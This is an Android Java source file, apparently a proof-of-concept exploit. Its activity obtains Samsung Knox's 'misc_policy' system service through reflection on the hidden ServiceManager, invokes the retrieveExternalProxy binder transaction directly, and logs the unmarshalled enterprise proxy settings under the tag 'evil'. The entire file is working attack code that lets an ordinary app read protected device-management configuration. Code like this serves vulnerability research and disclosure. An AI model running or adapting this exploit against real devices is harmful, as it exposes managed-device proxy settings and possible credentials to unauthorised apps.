package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

import com.google.gson.Gson;

public class MainActivity extends Activity {
    static final int TRANSACTION_retrieveExternalProxy = 30;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("misc_policy");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

            Parcel reply = Parcel.obtain();

            binder.transact(TRANSACTION_retrieveExternalProxy, parcel, reply, 0);
            reply.readException();
            if (reply.readBoolean()) {
                Parcelable.Creator creator = (Parcelable.Creator) Class.forName("com.samsung.android.knox.net.ProxyProperties")
                        .getField("CREATOR")
                        .get(null);
                Object proxyObj = creator.createFromParcel(reply);
                Log.d("evil", "Result: " + new Gson().toJson(proxyObj));
            } else {
                Log.d("evil", "Result: null");
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}